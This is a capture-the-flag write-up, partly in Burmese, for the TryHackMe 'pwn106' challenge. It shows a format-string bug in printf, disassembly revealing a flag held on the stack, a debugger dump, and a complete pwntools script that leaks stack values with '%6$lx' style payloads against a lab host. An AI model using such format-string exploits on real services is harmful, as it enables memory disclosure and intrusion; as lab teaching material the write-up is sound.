
#### pwn106

ဒီအပုဒ်ကတော့နည်းနည်းစားတယ်

```c
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

security  ကတော့ ကောင်းတယ်
main ထဲမှာ` printf vulnearability `ဘဲတွေ့တယ်
အခြား functionမပါဘူး

```c

void main(void)

{
  long in_FS_OFFSET;
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00102119);
  printf("Enter your THM username to participate in the giveaway: ");
  read(0,local_48,0x32);
  printf("\nThanks ");
  printf(local_48);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

နောက်ပြီးမှတွေ့ရတာက
assembly codes ထဲမှာ
```c
        0010125a e8 1a ff        CALL       setup                                            undefined setup()
                 ff ff
        0010125f b8 00 00        MOV        EAX,0x0
                 00 00
        00101264 e8 98 ff        CALL       banner                                           undefined banner()
                 ff ff
        00101269 48 b8 54        MOV        RAX,"[XXX{MHT"
                 48 4d 7b 
                 58 58 58 5b
        00101273 48 ba 66        MOV        RDX,"der_galf"
                 6c 61 67 
                 5f 72 65 64
        0010127d 48 89 45 a0     MOV        qword ptr [RBP + local_68],RAX
        00101281 48 89 55 a8     MOV        qword ptr [RBP + local_60],RDX
        00101285 48 b8 61        MOV        RAX,"XX]detca"
                 63 74 65 
                 64 5d 58 58



```


```c
   0x000055555555525a <+28>:    call   0x555555555179 <setup>
   0x000055555555525f <+33>:    mov    eax,0x0
   0x0000555555555264 <+38>:    call   0x555555555201 <banner>
   0x0000555555555269 <+43>:    movabs rax,0x5b5858587b4d4854
   0x0000555555555273 <+53>:    movabs rdx,0x6465725f67616c66
   0x000055555555527d <+63>:    mov    QWORD PTR [rbp-0x60],rax
   0x0000555555555281 <+67>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000555555555285 <+71>:    movabs rax,0x58585d6465746361
   0x000055555555528f <+81>:    mov    QWORD PTR [rbp-0x50],rax

```

string hex တွေသွားတွေ့တယ်
ဘာလို့ decompiled C မှာမတွေ့လဲဆို
`Decompiler` က code ကို analysis လုပ်တဲ့အခါ ဒီ variable ထဲကို တန်ဖိုးတွေ ထည့်ထားပေမဲ့ နောက်ပိုင်းမှာ ဘယ်နေရာမှာမှ ပြန်မသုံးထားဘူး" လို့ ယူဆရင် အဲဒီအပိုင်းကို ဖျောက်ထားလို့
Binary file ကို compile လုပ်လိုက်တဲ့အခါ ဒီစာသားတွေကို variable အနေနဲ့ မသိမ်းဘဲ 
CPU registers ထဲကို တိုက်ရိုက်ထည့်ခိုင်းတဲ့ hardware level command တွေအဖြစ် ပြောင်းလဲသွားလို့ဖြစ်တယ်
ဆိုတော့ `printf` ကိုသုံးပြီး stack ထဲ က ဒီကောင်တွေကို leak ရင်ရ

```c
pwndbg> tel 30
00:0000│ rsp 0x7fffffffdae0 ◂— 'THM{XXX[flag_redacted]XXX}'
01:0008│-058 0x7fffffffdae8 ◂— 'flag_redacted]XXX}'
02:0010│-050 0x7fffffffdaf0 ◂— 'acted]XXX}'
03:0018│-048 0x7fffffffdaf8 ◂— 0x7d58 /* 'X}' */
04:0020│ rdi 0x7fffffffdb00 ◂— 'fasdfdsfsd\n'
05:0028│-038 0x7fffffffdb08 ◂— 0xa6473 /* 'sd\n' */
06:0030│-030 0x7fffffffdb10 ◂— 0
... ↓        4 skipped

```

```python

from pwn import *



context.log_level = 'debug'
context.binary = "pwn106-user-1644300441063.pwn106-user"
elf = context.binary

def start():
    if args.REMOTE:
        return remote("10.48.158.37", 9006)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            break main
            continue
        ''')
    else:
        return process(elf.path)
    

def exploit(p):
    p.recvuntil(b"cipate in the giveaway: ")
    payload = b"%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx"
    p.sendline(payload)
    p.recvuntil(b"Thanks ")
    flags = p.recvline().decode().strip().split(".")
    ans = ""
    for flag in flags :
        #ans += bytes.fromhex(flag).decode('utf-8')
        ans += unhex(flag)[::-1].decode('utf-8', errors='ignore')
    return ans

if __name__ == '__main__':
    io = start()
    result = exploit(io)
    print(result)
    
    
```
